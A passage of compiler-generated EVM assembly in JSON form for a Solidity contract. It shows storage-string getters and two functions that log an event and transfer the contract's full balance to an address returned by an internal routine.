										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "tag",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "tag",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "tag",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 549,
											"end": 572,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "tag",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "tag",
											"source": 0,
											"value": "36"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "36"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "tag",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 579,
											"end": 604,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "tag",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14178,
											"end": 14185,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14204,
											"end": 14231,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "38"
										},
										{
											"begin": 14217,
											"end": 14230,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 14217,
											"end": 14228,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14217,
											"end": 14230,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14217,
											"end": 14230,
											"name": "tag",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 14217,
											"end": 14230,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14204,
											"end": 14216,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "41"
										},
										{
											"begin": 14204,
											"end": 14231,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14204,
											"end": 14231,
											"name": "tag",
											"source": 0,
											"value": "38"
										},
										{
											"begin": 14204,
											"end": 14231,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14197,
											"end": 14231,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14197,
											"end": 14231,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14131,
											"end": 14239,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 15213,
											"end": 15400,
											"name": "tag",
											"source": 0,
											"value": "28"
										},
										{
											"begin": 15213,
											"end": 15400,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "PUSH",
											"source": 0,
											"value": "CF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB"
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "PUSH",
											"source": 0,
											"value": "38"
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "PUSH data",
											"source": 0,
											"value": "9FB03945078BC6C7000C07D459687B271AE0ADC059777DEE3669B3C70B385107"
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "PUSH",
											"source": 0,
											"value": "38"
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "CODECOPY",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15261,
											"end": 15324,
											"name": "LOG1",
											"source": 0
										},
										{
											"begin": 15343,
											"end": 15359,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "43"
										},
										{
											"begin": 15343,
											"end": 15357,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "44"
										},
										{
											"begin": 15343,
											"end": 15359,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 15343,
											"end": 15359,
											"name": "tag",
											"source": 0,
											"value": "43"
										},
										{
											"begin": 15343,
											"end": 15359,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15369,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 15335,
											"end": 15369,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 15370,
											"end": 15391,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "46"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "46"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 15335,
											"end": 15392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15213,
											"end": 15400,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 15517,
											"end": 15707,
											"name": "tag",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 15517,
											"end": 15707,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "PUSH",
											"source": 0,
											"value": "CF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB"
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "PUSH",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "PUSH data",
											"source": 0,
											"value": "6350D1A48231284A8341DBB6CEC434401EEC03DD1DB1D0D6D2F253F7A8B3ECA6"
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "PUSH",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "CODECOPY",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15570,
											"end": 15628,
											"name": "LOG1",
											"source": 0
										},
										{
											"begin": 15647,
											"end": 15666,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "48"
										},
										{
											"begin": 15647,
											"end": 15664,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 15647,
											"end": 15666,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 15647,
											"end": 15666,
											"name": "tag",
											"source": 0,
											"value": "48"
										},
										{
											"begin": 15647,
											"end": 15666,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15676,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 15639,
											"end": 15676,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 15677,
											"end": 15698,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 15639,
											"end": 15699,
											"name": "SWAP1",
